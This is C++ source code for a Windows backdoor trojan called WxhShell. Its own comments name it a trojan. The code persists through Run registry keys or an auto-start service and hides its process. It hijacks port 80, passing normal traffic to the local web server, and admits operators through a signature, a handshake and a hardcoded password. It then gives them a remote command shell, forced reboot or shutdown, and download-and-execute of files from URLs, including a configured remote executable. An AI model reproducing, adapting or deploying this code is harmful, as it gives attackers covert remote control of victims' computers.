// winshell.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <winsvc.h>
#include <urlmon.h>
#include "IPHlpApi.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "urlmon.lib")
#pragma comment(lib,"Iphlpapi.lib")

#define MAX_USER     100  // 最大客户端连接数
#define BUF_SOCK     200  // sock buffer
#define KEY_BUFF     255  // 输入 buffer

#define REBOOT       0    // 重启
#define SHUTDOWN     1    // 关机

#define DEF_PORT     80 // 监听端口

#define REG_LEN      16   // 注册表键长度
#define SVC_LEN      80   // NT服务名长度

#define OWN_KEY		346//密钥
#define DEFAULT_DESTINATION "202.115.32.145"
#define INVALID_ADDRESS 0
#define OWN_SIGN     "scuclark\n" //自身木马标志

char IpAddr[100];
int mainid=0;
HANDLE ownevent;
//自定义握手协议结构体
typedef struct conninfo 
{
	int go;
	int come;
	char a;
} * Pconninfo;
//端口复用线程信息
typedef struct ThreadInfo
{
	SOCKET tcpSock;
	SOCKET rawSock;
	
}ThreadInfo;
// 从dll定义API
typedef DWORD (WINAPI pREGISTERSERVICEPROCESS) (DWORD,DWORD);
typedef LONG  (WINAPI *PROCNTQSIP)(HANDLE,UINT,PVOID,ULONG,PULONG);
typedef BOOL  (WINAPI *ENUMPROCESSMODULES) (HANDLE hProcess, HMODULE * lphModule, DWORD cb, LPDWORD lpcbNeeded);
typedef DWORD (WINAPI *GETMODULEBASENAME) (HANDLE hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize);
DWORD WINAPI doReTranToHost(void *lp);
SOCKET Make_Connection(unsigned long ip,int port,int timeout);
DWORD GetBestIp();
int AverageRandom(int min,int max);
//自定义二路握手函数
BOOL connestab(SOCKET client);
//自定义数据读写函数
DWORD WINAPI  readwrite(SOCKET tr,SOCKET tc);

// wxhshell配置信息
struct WSCFG {
    int  ws_port;             // 监听端口
    char ws_passstr[REG_LEN]; // 口令
    int  ws_autoins;          // 安装标记, 1=yes 0=no
    char ws_regname[REG_LEN]; // 注册表键名
    char ws_svcname[REG_LEN]; // 服务名
    char ws_svcdisp[SVC_LEN]; // 服务显示名
    char ws_svcdesc[SVC_LEN]; // 服务描述信息
    char ws_passmsg[SVC_LEN]; // 密码输入提示信息
	int  ws_downexe;          // 下载执行标记, 1=yes 0=no
	char ws_fileurl[SVC_LEN]; // 下载文件的 url, "http://xxx/file.exe"
	char ws_filenam[SVC_LEN]; // 下载后保存的文件名
	
};

// default Wxhshell configuration
struct WSCFG wscfg={DEF_PORT,
"scuclark",
0,
"Wxhshell",
"Wxhshell",
"WxhShell Service",
"Wrsky Windows CmdShell Service",
"Please Input Your Password: ",
0,
"http://www.wrsky.com/wxhshell.exe",
"Wxhshell.exe"
};

// 消息定义模块
char *msg_ws_copyright="\n\rWxhShell v1.0 (C)2005 http://www.wrsky.com\n\rMake by 虚幻灵者\n\r";
char *msg_ws_prompt="\n\r? for help\n\r#>";
char *msg_ws_cmd="\n\ri Install\n\rr Remove\n\rp Path\n\rb reboot\n\rd shutdown\n\rs Shell\n\rx exit\n\rq Quit\n\r\n\rDownload:\n\r#>http://.../server.exe\n\r";
char *msg_ws_ext="\n\rExit.";
char *msg_ws_end="\n\rQuit.";
char *msg_ws_boot="\n\rReboot...";
char *msg_ws_poff="\n\rShutdown...";
char *msg_ws_down="\n\rSave to ";

char *msg_ws_err="\n\rErr!";
char *msg_ws_ok="\n\rOK!";

char ExeFile[MAX_PATH];
int nUser = 0;
HANDLE handles[MAX_USER];
int OsIsNt;

SERVICE_STATUS          serviceStatus;
SERVICE_STATUS_HANDLE   hServiceStatusHandle;

// 函数声明
int Install(void);
int Uninstall(void);
int DownloadFile(char *sURL, SOCKET wsh);
int Boot(int flag);
void HideProc(void);
int GetOsVer(void);
int Wxhshell(SOCKET wsl);
void TalkWithClient(void *cs);
int CmdShell(SOCKET sock);
int StartFromService(void);
int StartWxhshell(LPSTR lpCmdLine);

VOID WINAPI NTServiceMain( DWORD dwArgc, LPTSTR *lpszArgv );
VOID WINAPI NTServiceHandler( DWORD fdwControl );

// 数据结构和表定义
SERVICE_TABLE_ENTRY DispatchTable[] =
{
	{wscfg.ws_svcname, NTServiceMain},
	{NULL, NULL}
};

// 自我安装
int Install(void)
{
    char svExeFile[MAX_PATH];
    HKEY key;
    strcpy(svExeFile,ExeFile);
	
	// 如果是win9x系统，修改注册表设为自启动
	if(!OsIsNt)
	{
		if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) 
		{
			RegSetValueExA(key,wscfg.ws_regname,0,REG_SZ,(BYTE *)svExeFile,lstrlen(svExeFile));
			RegCloseKey(key);
			if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",&key)==ERROR_SUCCESS) 
			{
				RegSetValueEx(key,wscfg.ws_regname,0,REG_SZ,(BYTE *)svExeFile,lstrlen(svExeFile));
				RegCloseKey(key);
				return 0;
			}
		}
	}
	else {
		
		// 如果是NT以上系统，安装为系统服务
		SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if (schSCManager!=0)
		{
			SC_HANDLE schService = CreateServiceA
				(
				schSCManager,
				wscfg.ws_svcname,
				wscfg.ws_svcdisp,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS ,//can interact with the desktop
				SERVICE_AUTO_START,
				SERVICE_ERROR_NORMAL,
				svExeFile,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL
				);
			if (schService!=0)
			{
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				strcpy(svExeFile,"SYSTEM\\CurrentControlSet\\Services\\");
				strcat(svExeFile,wscfg.ws_svcname);
				if(RegOpenKey(HKEY_LOCAL_MACHINE,svExeFile,&key)==ERROR_SUCCESS) 
				{
					RegSetValueEx(key,"Description",0,REG_SZ,(BYTE *)wscfg.ws_svcdesc,lstrlen(wscfg.ws_svcdesc));
					RegCloseKey(key);
					return 0;
				}
			}
			CloseServiceHandle(schSCManager);
		}
	}
	
	return 1;
}

// 自我卸载
int Uninstall(void)
{
    HKEY key;
	
	if(!OsIsNt) {
		if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
			RegDeleteValue(key,wscfg.ws_regname);
			RegCloseKey(key);
			if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",&key)==ERROR_SUCCESS) {
				RegDeleteValue(key,wscfg.ws_regname);
				RegCloseKey(key);
				return 0;
			}
		}
	}
	else {
		
		SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (schSCManager!=0)
		{
			SC_HANDLE schService = OpenService( schSCManager, wscfg.ws_svcname, SERVICE_ALL_ACCESS);
			if (schService!=0)
			{
				if(DeleteService(schService)!=0) {
					CloseServiceHandle(schService);
					CloseServiceHandle(schSCManager);
					return 0;
				}
				CloseServiceHandle(schService);
			}
			CloseServiceHandle(schSCManager);
		}
	}
	
	return 1;
}

// 从指定url下载文件
int DownloadFile(char *sURL, SOCKET wsh)
{
    HRESULT hr;
	char seps[]= "/";
	char *token;
	char *file;
	char myURL[MAX_PATH];
	char myFILE[MAX_PATH];
	
	strcpy(myURL,sURL);
    token=strtok(myURL,seps);
	while(token!=NULL)
    {
        file=token;
		token=strtok(NULL,seps);
    }
	
	GetCurrentDirectory(MAX_PATH,myFILE);
	strcat(myFILE, "\\");
	strcat(myFILE, file);
    send(wsh,myFILE,strlen(myFILE),0);
	send(wsh,"...",3,0);
	hr = URLDownloadToFile(0, sURL, myFILE, 0, 0);
    if(hr==S_OK)
		return 0;
	else
		return 1;
	
}

// 系统电源模块
int Boot(int flag)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
	
    if(OsIsNt) 
	{
		OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES)NULL, 0);
		if(flag==REBOOT) 
		{
			if(ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0))
				return 0;
		}
		else
		{
			if(ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0))
				return 0;
		}
    }
    else 
	{
		if(flag==REBOOT) {
			if(ExitWindowsEx(EWX_REBOOT + EWX_FORCE,0))
				return 0;
		}
		else 
		{
			if(ExitWindowsEx(EWX_SHUTDOWN + EWX_FORCE,0))
				return 0;
		}
	}
	
	return 1;
}

// win9x进程隐藏模块
void HideProc(void)
{
	
    HINSTANCE hKernel=LoadLibrary("Kernel32.dll");
    if ( hKernel != NULL )
    {
		pREGISTERSERVICEPROCESS *pRegisterServiceProcess=(pREGISTERSERVICEPROCESS *)GetProcAddress(hKernel,"RegisterServiceProcess");
        ( *pRegisterServiceProcess)(GetCurrentProcessId(),1);
        FreeLibrary(hKernel);
    }
	
	return;
}

// 获取操作系统版本
int GetOsVer(void)
{
    OSVERSIONINFO winfo;
    winfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
    GetVersionEx(&winfo);
    if(winfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
		return 1;
    else
		return 0;
}

// 客户端句柄模块
int Wxhshell(SOCKET wsl)
{
    SOCKET wsh;
    struct sockaddr_in client;
    DWORD myID;
	int count;
	char cmd[5];
	
    while(nUser<MAX_USER)
	{
		char myFlag[32];
		ThreadInfo threadInfo;
		int nSize=sizeof(client);
		//等待连接
        wsh=accept(wsl,(struct sockaddr *)&client,&nSize);
		if(wsh==INVALID_SOCKET) return 1;
		//以'\n'为终止符接收客户发送的验证字符串
		count=0;
		while(count<32)
		{ 
			if(recv(wsh,cmd,1,0)==SOCKET_ERROR)
			{
				closesocket(wsh); 
				return FALSE;
			}
			myFlag[count]=cmd[0]; 
			if(cmd[0]==0x0a) 
			{ 
				myFlag[count]='\n'; 
				myFlag[++count]=0;
				break; 
			} 
			count++; 
		} 
		//初步判断是否为木马请求
		if (strncmp(myFlag,OWN_SIGN,strlen(OWN_SIGN))!=0)
		{
			u_long loopIP=inet_addr("127.0.0.1");
			SOCKET loopback=Make_Connection(loopIP,80,120);
			if (loopback<0)
			{
				closesocket(wsh);
				continue;
			}
			//为新线程复制参数建立事件
			ownevent = CreateEvent(NULL,FALSE,FALSE,NULL);
			send(loopback,myFlag,count,0);
			
			threadInfo.rawSock=loopback;
			threadInfo.tcpSock=wsh;
			
			CreateThread(0, 0, doReTranToHost, &threadInfo, 0, &myID);
			//等待新线程复制完参数再继续向下执行
			if(WaitForSingleObject(ownevent,INFINITE)==WAIT_FAILED)
			{
				continue;
			}
			CloseHandle(ownevent);
			continue;			
		}
		//初步判断是木马请求,再执行二路握手,失败则关闭连接
		if(connestab(wsh)==FALSE)
		{
			closesocket(wsh);
			continue;
		}
		//握手成功,开启木马功能执行线程
		handles[nUser]=CreateThread(0,1000,(LPTHREAD_START_ROUTINE) TalkWithClient,(VOID *) wsh, 0, &myID);
		if(handles[nUser]==0)
			closesocket(wsh);
		else
			nUser++;
    }
    WaitForMultipleObjects(MAX_USER,handles,TRUE,INFINITE);
	
    return 0;
}

// 关闭 socket
void CloseIt(SOCKET wsh)
{
	closesocket(wsh);
	nUser--;
	ExitThread(0);
}

// 客户端请求句柄
void TalkWithClient(void *cs)
{
	
    SOCKET wsh=(SOCKET)cs;
    char pwd[SVC_LEN];
    char cmd[KEY_BUFF];
	char chr[1];
	int i,j;
	
    while (nUser < MAX_USER) 
	{
		
		if(wscfg.ws_passstr) 
		{
			if(strlen(wscfg.ws_passmsg)) 
				send(wsh,wscfg.ws_passmsg,strlen(wscfg.ws_passmsg),0);
			//send(wsh,wscfg.ws_passmsg,strlen(wscfg.ws_passmsg),0);
			//ZeroMemory(pwd,KEY_BUFF);
			i=0;
			while(i<SVC_LEN) {
				
				// 设置超时
				fd_set FdRead;
				struct timeval TimeOut;
				FD_ZERO(&FdRead);
				FD_SET(wsh,&FdRead);
				TimeOut.tv_sec=8;
				TimeOut.tv_usec=0;
				int Er=select(wsh+1, &FdRead, NULL, NULL, &TimeOut);
				if((Er==SOCKET_ERROR) || (Er==0)) CloseIt(wsh);
				
				if(recv(wsh,chr,1,0)==SOCKET_ERROR) 
					CloseIt(wsh);
				pwd[i]=chr[0];
				if(chr[0]==0xd || chr[0]==0xa) {
					pwd[i]=0;
					break;
				}
				i++;
			}
			
			// 如果是非法用户，关闭 socket
            if(strcmp(pwd,wscfg.ws_passstr)) 
				CloseIt(wsh);
		}
		
		send(wsh,msg_ws_copyright,strlen(msg_ws_copyright),0);
		send(wsh,msg_ws_prompt,strlen(msg_ws_prompt),0);
		
		while(1)
		{
			
			ZeroMemory(cmd,KEY_BUFF);
			
			// 自动支持客户端 telnet标准   
			j=0;
			while(j<KEY_BUFF) {
				if(recv(wsh,chr,1,0)==SOCKET_ERROR) CloseIt(wsh);
				cmd[j]=chr[0];
				if(chr[0]==0xa || chr[0]==0xd) {
					cmd[j]=0;
					break;
				}
				j++;
			}
			
			// 下载文件
			if(strstr(cmd,"http://")) {
				send(wsh,msg_ws_down,strlen(msg_ws_down),0);
				if(DownloadFile(cmd,wsh))
					send(wsh,msg_ws_err,strlen(msg_ws_err),0);
				else
					send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
			}
			else {
				
				switch(cmd[0]) {
					
					// 帮助
				case '?': {
					send(wsh,msg_ws_cmd,strlen(msg_ws_cmd),0);
					break;
						  }
					// 安装
				case 'i': {
					if(Install())
						send(wsh,msg_ws_err,strlen(msg_ws_err),0);
					else
						send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
					break;
						  }
					// 卸载
				case 'r': {
					if(Uninstall())
						send(wsh,msg_ws_err,strlen(msg_ws_err),0);
					else
						send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
					break;
						  }
					// 显示 wxhshell 所在路径
				case 'p': {
					char svExeFile[MAX_PATH];
					strcpy(svExeFile,"\n\r");
					strcat(svExeFile,ExeFile);
					send(wsh,svExeFile,strlen(svExeFile),0);
					break;
						  }
					// 重启
				case 'b': {
					send(wsh,msg_ws_boot,strlen(msg_ws_boot),0);
					if(Boot(REBOOT))
						send(wsh,msg_ws_err,strlen(msg_ws_err),0);
					else {
						closesocket(wsh);
						ExitThread(0);
					}
					break;
						  }
					// 关机
				case 'd': {
					send(wsh,msg_ws_poff,strlen(msg_ws_poff),0);
					if(Boot(SHUTDOWN))
						send(wsh,msg_ws_err,strlen(msg_ws_err),0);
					else {
						closesocket(wsh);
						ExitThread(0);
					}
					break;
						  }
					// 获取shell
				case 's': {
					CmdShell(wsh);
					closesocket(wsh);
					ExitThread(0);
					break;
						  }
					// 退出
				case 'x': {
					send(wsh,msg_ws_ext,strlen(msg_ws_ext),0);
					CloseIt(wsh);
					break;
						  }
					// 离开
				case 'q': {
					send(wsh,msg_ws_end,strlen(msg_ws_end),0);
					closesocket(wsh);
					WSACancelBlockingCall();
					exit(1);
					break;
						  }
				}
			}
			
			// 提示信息
			if(strlen(cmd)) send(wsh,msg_ws_prompt,strlen(msg_ws_prompt),0);
  }
    } 
	
    return;
}


// shell模块句柄
int CmdShell(SOCKET  sock)
{
	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput=si.hStdOutput =si.hStdError =(void *)sock;
	PROCESS_INFORMATION ProcessInfo;
	char cmdline[]="cmd";
	CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInfo);
    return 0;
}

// 自身启动模式
int StartFromService(void)
{
	typedef struct
	{
		DWORD ExitStatus;
		DWORD PebBaseAddress;
		DWORD AffinityMask;
		DWORD BasePriority;
		ULONG UniqueProcessId;
		ULONG InheritedFromUniqueProcessId;
	}   PROCESS_BASIC_INFORMATION;
	
	PROCNTQSIP NtQueryInformationProcess;
	
	static ENUMPROCESSMODULES g_pEnumProcessModules = NULL ;
	static GETMODULEBASENAME g_pGetModuleBaseName = NULL ;
	
    HANDLE                    hProcess;
    PROCESS_BASIC_INFORMATION pbi;
	
    HINSTANCE hInst = LoadLibraryA("PSAPI.DLL");
    if(NULL == hInst )
		return 0;
	
    g_pEnumProcessModules = (ENUMPROCESSMODULES)GetProcAddress(hInst ,"EnumProcessModules");
    g_pGetModuleBaseName = (GETMODULEBASENAME)GetProcAddress(hInst, "GetModuleBaseNameA");
    NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");
	
    if (!NtQueryInformationProcess) 
		return 0;
	
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,GetCurrentProcessId());
    if(!hProcess)  
		return 0;
	
    if(NtQueryInformationProcess( hProcess, 0, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))
		return 0;
	
    CloseHandle(hProcess);
	
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pbi.InheritedFromUniqueProcessId);
	if(hProcess==NULL) 
		return 0;
	
	HMODULE hMod;
	char procName[255];
	unsigned long cbNeeded;
	
	if(g_pEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) 
		g_pGetModuleBaseName(hProcess, hMod, procName, sizeof(procName));
	
    CloseHandle(hProcess);
	
	if(strstr(procName,"services"))
		return 1; // 以服务启动
	
    return 0; // 注册表启动
}

// 主模块
int StartWxhshell(LPSTR lpCmdLine)
{
    SOCKET wsl;
	BOOL val=TRUE;
    int port=0;
    struct sockaddr_in door;
	
    if(wscfg.ws_autoins) Install();
	
	port=atoi(lpCmdLine);
	
	if(port<=0) 
		port=wscfg.ws_port;
	
    WSADATA data;
    if(WSAStartup(MAKEWORD(2,2),&data)!=0) return 1;
	
    if((wsl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0)) == INVALID_SOCKET) 
		return 1;    
	
	setsockopt(wsl,SOL_SOCKET,SO_REUSEADDR,(char *)&val,sizeof(val));
    door.sin_family = AF_INET;
    door.sin_addr.s_addr = GetBestIp();
    door.sin_port = htons(port);
	
    if(bind(wsl, (const struct sockaddr *) &door,sizeof(door)) == INVALID_SOCKET) 
	{
		closesocket(wsl);
		return 1;
	}
	
    if(listen(wsl,2) == INVALID_SOCKET) 
	{
		closesocket(wsl);
		return 1;
	}
    Wxhshell(wsl);
    WSACleanup();
	
	return 0;
	
}

// 以NT服务方式启动
VOID WINAPI NTServiceMain( DWORD dwArgc, LPSTR *lpszArgv )
{
	DWORD   status = 0;
    DWORD   specificError = 0xfffffff;
	
    serviceStatus.dwServiceType        = SERVICE_WIN32;
    serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
    serviceStatus.dwWin32ExitCode      = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint         = 0;
    serviceStatus.dwWaitHint           = 0;
	
    hServiceStatusHandle = RegisterServiceCtrlHandler(wscfg.ws_svcname, NTServiceHandler);
    if (hServiceStatusHandle==0) return;
	
	status = GetLastError();
    if (status!=NO_ERROR)
	{
        serviceStatus.dwCurrentState       = SERVICE_STOPPED;
        serviceStatus.dwCheckPoint         = 0;
        serviceStatus.dwWaitHint           = 0;
        serviceStatus.dwWin32ExitCode      = status;
        serviceStatus.dwServiceSpecificExitCode = specificError;
        SetServiceStatus(hServiceStatusHandle, &serviceStatus);
        return;
    }
	
    serviceStatus.dwCurrentState       = SERVICE_RUNNING;
    serviceStatus.dwCheckPoint         = 0;
    serviceStatus.dwWaitHint           = 0;
    if(SetServiceStatus(hServiceStatusHandle, &serviceStatus)) StartWxhshell("");
}

// 处理NT服务事件，比如：启动、停止
VOID WINAPI NTServiceHandler(DWORD fdwControl)
{
	switch(fdwControl)
	{
	case SERVICE_CONTROL_STOP:
		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState  = SERVICE_STOPPED;
		serviceStatus.dwCheckPoint    = 0;
		serviceStatus.dwWaitHint      = 0;
		{
			SetServiceStatus(hServiceStatusHandle, &serviceStatus);
		}
		return;
	case SERVICE_CONTROL_PAUSE:
		serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	};
    SetServiceStatus(hServiceStatusHandle,  &serviceStatus);
}

// 标准应用程序主函数
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	// 获取操作系统版本
	OsIsNt=GetOsVer();
	GetModuleFileName(NULL,ExeFile,MAX_PATH);
	
    // 从命令行安装
    if(strpbrk(lpCmdLine,"iI")) 
		Install();//安装服务
	
    // 下载+执行文件
	if(wscfg.ws_downexe) 
	{
		if(URLDownloadToFileA(0, wscfg.ws_fileurl, wscfg.ws_filenam, 0, 0)==S_OK)
			WinExec(wscfg.ws_filenam,SW_HIDE);
	}
	
	if(!OsIsNt) 
	{
		// 如果时win9x，隐藏进程并且设置为注册表启动
		HideProc();  
		StartWxhshell(lpCmdLine);
	}
	else
		if(StartFromService())
			// 以服务方式启动
			StartServiceCtrlDispatcher(DispatchTable);
		else
			// 普通方式启动
			StartWxhshell(lpCmdLine);
		return 0;
}

DWORD WINAPI doReTranToHost(void *lp)
{
	
	ThreadInfo *lpTh=(ThreadInfo*)lp;
	SOCKET tcpSock=lpTh->tcpSock;
	SOCKET	loopSock=lpTh->rawSock;
	int rel;
	rel=readwrite(loopSock,tcpSock);
	
	return rel;
}

DWORD WINAPI  readwrite(SOCKET tr,SOCKET tc)
{
	char  bufc[40960],bufr[40960];
	char* recvbufpc;
	char* recvbufpr;
	long recvr,recvc;
	FD_SET ding,ding1;
	int err,ret;
	SOCKET clientr=tr,clientc=tc;
	//告诉主线程参数复制完毕
	SetEvent(ownevent);
	recvr=recvc=0;
	struct timeval TimeOut; 
	TimeOut.tv_sec=0; 
	TimeOut.tv_usec=1000; 
	FD_ZERO(&ding); 
	FD_ZERO(&ding1);
	FD_SET(clientc,&ding);
	FD_SET(clientr,&ding);
	
	while (FD_ISSET(clientc,&ding) && FD_ISSET(clientr,&ding) ) 
	{
		//赋初始值
		ding1=ding;
		
		//超时或错误
		int Er=select(16, &ding1, 0, 0, &TimeOut);
		if( (Er==SOCKET_ERROR))
		{
			FD_CLR(clientc,&ding1);
			FD_CLR (clientc, &ding);
		}
		if( FD_ISSET(clientc,&ding1))
		{
			ret=recv(clientc, bufc, sizeof(bufc), 0);
			if(ret == SOCKET_ERROR || ret==0 || ret == WSAECONNRESET)
			{
				FD_ZERO (&ding);
			}		//可读但已经关闭连接
			else
			{
				recvc=ret;
				bufc[ret] = '\0';
				recvbufpc= bufc;
			}
		}
		if( FD_ISSET(clientr,&ding1))
		{
			ret=recv(clientr, bufr, sizeof(bufr), 0);
			if(ret == SOCKET_ERROR || ret==0 || ret == WSAECONNRESET)
			{
				FD_ZERO (&ding);
			}		//可读但已经关闭连接
			else
			{
				recvr=ret;
				bufr[ret] = '\0';
				recvbufpr= bufr;
			}
		}
print:
		if(recvr)
		{	
			ret=send(clientc,recvbufpr,recvr,0);
			if(ret>0)
			{
				recvbufpr+=ret;
				recvr-=ret;
			}
			else
			{
				err=WSAGetLastError();
				if(err!=WSAETIMEDOUT)
				{
					FD_ZERO (&ding);
					recvr=0;
				}
			}
		}
		
		if(recvc)
		{
			ret=send(clientr,recvbufpc,recvc,0);
			if(ret>0)
			{
				recvbufpc+=ret;
				recvc-=ret;
			}
			else
			{				
				err=WSAGetLastError();
				if(err!=WSAETIMEDOUT)
				{
					FD_ZERO (&ding);
					recvc=0;
				}
			}
		}
		Sleep(1);
		if(recvr || recvc )goto print;
	}
	closesocket(clientr); 
	closesocket(clientc);
	return 1;
}

SOCKET Make_Connection(unsigned long ip,int port,int timeout)
{
	struct sockaddr_in target;
	SOCKET s;
	int i;
	DWORD bf;
	fd_set wd;
	struct timeval tv;
	
	s = socket(AF_INET,SOCK_STREAM,0);
	if(s<0)
		return -1;
	
	target.sin_family = AF_INET;
	target.sin_addr.s_addr = ip;
	if(target.sin_addr.s_addr==0)
	{
		closesocket(s);
		return -2;
	}
	target.sin_port = htons(port);
	bf = 1;
	ioctlsocket(s,FIONBIO,&bf);
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	FD_ZERO(&wd);
	FD_SET(s,&wd);
	connect(s,(struct sockaddr *)&target,sizeof(target));
	if((i=select(s+1,0,&wd,0,&tv))==(-1))
	{
		closesocket(s);
		return -3;
	}
	if(i==0)
	{
		closesocket(s);
		return -4;
	}
	i = sizeof(int);
	getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
	if((bf!=0)||(i!=sizeof(int)))
	{
		closesocket(s);
		return -5;
	}
	ioctlsocket(s,FIONBIO,&bf);
	return s;
}

DWORD GetBestIp()		//获得本机最好的IP地址
{
	PMIB_IPADDRTABLE    pAddrTable(NULL);
    PMIB_IPADDRROW      pAddrRow(NULL);
	ULONG				ulSize(0);
	DWORD				ret = INVALID_ADDRESS;
	char *              pBuffer = NULL;
	DWORD				dwBestIndex = INVALID_ADDRESS;
	//获得最佳IP接口的索引
	DWORD				dwResult = GetBestInterface(inet_addr(DEFAULT_DESTINATION), &dwBestIndex);
	
	if ( dwResult != NO_ERROR ) 
	{	//有错误,返回不可用地址
		return INVALID_ADDRESS;
	}
	//获得本机所有的IP列表
    GetIpAddrTable((PMIB_IPADDRTABLE)(char *)pBuffer, &ulSize, TRUE);
	
	pBuffer = new char[ulSize];	
	
	dwResult = GetIpAddrTable((PMIB_IPADDRTABLE)(char *)pBuffer, &ulSize, TRUE);
	if ( dwResult == NO_ERROR )
	{
		pAddrTable = (PMIB_IPADDRTABLE)(char *) pBuffer;
		
		for (DWORD x = 0; x < pAddrTable->dwNumEntries; x++)
		{
			pAddrRow = (PMIB_IPADDRROW) &(pAddrTable->table[x]);
			//如果和最佳索引相等,则返回其地址
			if ( pAddrRow->dwIndex == dwBestIndex )
			{
				ret = pAddrRow->dwAddr;
				delete [] pBuffer;
				return ret;
			}
		}
	}
    delete [] pBuffer;
	return INVALID_ADDRESS;
}	

BOOL connestab(SOCKET client)
{
	char buf[256],cmd[5];
	int count;
	conninfo info;
	Pconninfo infop=&info;
	info.a='\n';
	int a=(int)infop;
	info.come=68;
	info.go=AverageRandom(100000,999999);
	//发送第一路木马协议
	send(client,(char *)infop,sizeof(info)-3,NULL);
	//接收对方回应的协议
	count=0;
	while(count<256)
	{ 
		if(recv(client,cmd,1,0)==SOCKET_ERROR)
		{
			closesocket(client); 
			return FALSE;
		}
		buf[count]=cmd[0]; 
		if(cmd[0]==0xa || cmd[0]==0xd) 
		{ 
			buf[count]=0; 
			break; 
		} 
		count++; 
	} 
	//验证对方是否为可信用户
	if( ((Pconninfo)buf)->come!=info.go%OWN_KEY)return FALSE;
	info.come=((Pconninfo)buf)->go%OWN_KEY;
	info.go='o'+'k';
	infop=&info;
	//验证成功,发送第二路木马协议,如果对方验证成功,则整个握手过程成功完成
	send(client,(char *)infop,sizeof(info)-3,NULL);
	return TRUE;
}

int AverageRandom(int min,int max)
{
	int minInteger = (int)(min*10000);
	int maxInteger = (int)(max*10000);
	int randInteger = rand()*rand();
	int diffInteger = maxInteger - minInteger;
	int resultInteger = randInteger % diffInteger + minInteger;
	return resultInteger/10000;
}														//产生随机数
